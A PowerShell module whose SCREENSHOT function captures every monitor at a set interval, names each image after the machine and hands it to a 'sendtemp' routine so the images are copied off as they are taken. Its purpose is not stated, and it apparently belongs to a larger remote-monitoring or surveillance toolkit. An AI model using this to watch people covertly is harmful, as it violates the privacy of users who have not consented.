$script:name=($MyInvocation.MyCommand.Name).Trim('.ps1')

function SCREENSHOT($startat,$endat,$freq) {
	$ssactive="$env:USERPROFILE\ss.active"
	if (!(test-path $ssactive)) {
	#From https://stackoverflow.com/questions/2969321/how-can-i-do-a-screen-capture-in-windows-powershell
	if (!($endat)) {$endat=$end}
	if (!($startat)) {$startat=$start}
	if (!($freq)) {$freq=15}
	"Running from $startat to $endat"
	while ($startat -lt $endat) {
		"Running" | out-file $ssactive -force
	$rand=get-random -Minimum 1000 -Maximum 9999
	$snap="$TempDir\$env:computername-$rand-$filenameDate.png"
	Add-Type -AssemblyName System.Windows.Forms,System.Drawing
	$screens = [Windows.Forms.Screen]::AllScreens
	$top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
	$left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
	$width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
	$height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
	$bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
	$bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
	$graphics = [Drawing.Graphics]::FromImage($bmp)
	$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
	$bmp.Save("$snap")
	$graphics.Dispose()
	$bmp.Dispose()
	"Screenshot taken: $snap"
	sendtemp #copy images over as they are taken
	sleep -Seconds $freq
	[int64]$startat=get-date -Format yyyyMMddHHmm
	}
	}
	Remove-Item $ssactive -force -ErrorAction SilentlyContinue
}

write-host "$name loaded..." -ForegroundColor yellow -BackgroundColor black
